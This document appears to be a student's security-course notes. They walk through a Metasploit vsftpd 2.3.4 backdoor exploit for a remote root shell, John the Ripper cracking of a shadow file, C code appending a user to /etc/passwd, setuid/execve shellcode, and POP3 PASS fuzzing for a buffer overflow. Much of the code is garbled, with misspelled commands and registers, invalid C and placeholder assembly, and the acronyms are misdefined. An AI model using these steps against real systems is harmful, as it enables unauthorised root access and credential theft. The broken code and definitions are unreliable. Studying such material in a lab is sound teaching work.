# Remote Exploit 
## Using Metasploit Script  get Root shell using vsftpd
We will get a remote root shell. Start metasploit, search for exploits using
vsftp.

``` shell
$ mfsconsole
(msf) > search vsftpd # Search database for vsftp

# Finds exploit. 
(msf) > use exploit/unix/ftp/vsftp_234_backdoor
msf exploit (vsftpd_234_backdoor) > set RHOST 10.10.10.3
msf exploit (vsftpd_234_backdoor) > exploit

# From here we have a root shell on the remote machine
```

## Password cracking using John The Ripper
``` shell
$ cd <directory with shadow file>
$ john --show shadow-
````

# Shellcode and its representation in C & Assembly
Good website for looking for shellcode: https://wwww.exploit-db.com/exploits/

``` C
# include stdio

main()
{
    // Create a new user in /etc/passwd
    char *filename = "/etc/passwd";
    char *line = "hacitid..."; # Username with a hash

    int f_open;
    f_open = open(filename,o_wrong,o_append); # write only & append

    write(f_open, line, strlen(line));
    close(f_open);
    exit(0);
}

```

The code example above useful for adding a new user. We might want the 
shell code for this code. Below is the code for `fopen()`

``` assembly
mov eax, 5; 5 is operating code for open.
mov eab, filename;  get name of file
mov ecx, 1025; 
int 0x80;  Interrupt
mov ebx, eax;
```

## Code for getting a shell
``` C
main()
{
    char *name[2];
    name[0] = "/bin/sh";
    name[1] = NULL;
    setuid = (0,0); Set USID to zero for root privileges
    execve (name[0], name, NULL);
}
```

Again we can look for assembly representation for the code above. 
- We would have a data, global, and sector sections
- It is important to note that we need to remove any zero or null characters
for our assembly representation of our C code. 

``` assembly
; Section data
; some commands
; Section COde
start:
    mov;
    mov;
    mov;
    int 0x80;
; Execve() representation
execve:
    mov;
    mov;
    push;
    push;
    mov;
    mov;
    int 0x80;
```

# Project 3 Details - SNMAIL Hack
- *DEP*: Data Executive Prevention
- *ASCR*: Address Space layout Randomization

## POP3 Protocol Commands
- `USER` & `PASS`: Example `s.send("USER <USERNAME PASS <FUZZYING BUFFER>")`
- `pattern_create.rb`. When you are in the fuzzing stage,
and you are looking to find our how long of a password to pass in to
`PASS` command to offset and overwrite EPI use this function. Note you
need to figure out how to create enough space for your payload.
